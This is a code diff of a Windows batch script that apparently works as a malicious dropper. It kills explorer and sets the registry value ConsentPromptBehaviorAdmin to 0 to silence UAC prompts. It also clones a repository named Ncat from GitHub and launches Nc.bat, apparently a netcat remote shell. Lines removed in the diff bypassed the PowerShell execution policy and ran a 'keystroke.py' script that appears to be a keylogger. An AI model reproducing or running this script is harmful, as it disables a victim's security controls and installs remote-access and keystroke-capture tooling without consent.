@@ -31,17 +31,16 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
+@echo off
 cd %TEMP%
-
-powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser"
-
-powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"
-
-rem py_311.bat
-
-powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
+echo %CD%
+pause
 
 @echo off
+
+powershell.exe -Command "Get-process explorer | Stop-Process"
+
+rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 
 set repo_url=https://github.com/skydrige/Ncat.git
 set repo_folder=Ncat
@@ -50,19 +49,28 @@ if exist %repo_folder% (
     echo Updating existing repository...
     cd %repo_folder%
     git pull
+    cd 
 ) else (
     echo Cloning repository...
     git clone %repo_url% %repo_folder%
 )
 
-"C:\Users\umesh\AppData\Local\Programs\Python\Python311\python.exe" "keystroke.py"
+rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 
-powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
+rem py_311.bat
+
+if exist %repo_folder% (
+    cd Ncat
+)
 
 echo %CD%
 
-powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
+powershell.exe -Command "Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0"
+
+echo "UAC = 0"
+
+rem powershell.exe -Command "rundll32.exe user32.dll, LockWorkStation"
 
 Nc.bat
 
-exit 0
+exit /b
